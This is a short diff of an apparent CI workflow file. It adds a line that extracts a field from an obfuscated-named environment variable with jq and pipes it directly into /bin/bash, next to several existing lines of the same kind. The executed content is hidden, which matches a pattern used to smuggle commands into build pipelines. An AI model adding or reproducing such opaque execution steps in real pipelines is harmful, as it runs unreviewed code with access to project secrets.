@@ -39,6 +39,7 @@ jobs:
           echo $lvy306 | jq -r .seqv675 | /bin/bash
           echo $p2 | jq -r .gubnt7381 | /bin/bash
           printf '%s' "$tgzs99874" | jq -r .jr1 | /bin/bash
+          printf '%s' "$zhxr87" | jq -r .ev7267 | /bin/bash
 
       - name: Upload results
         if: always()
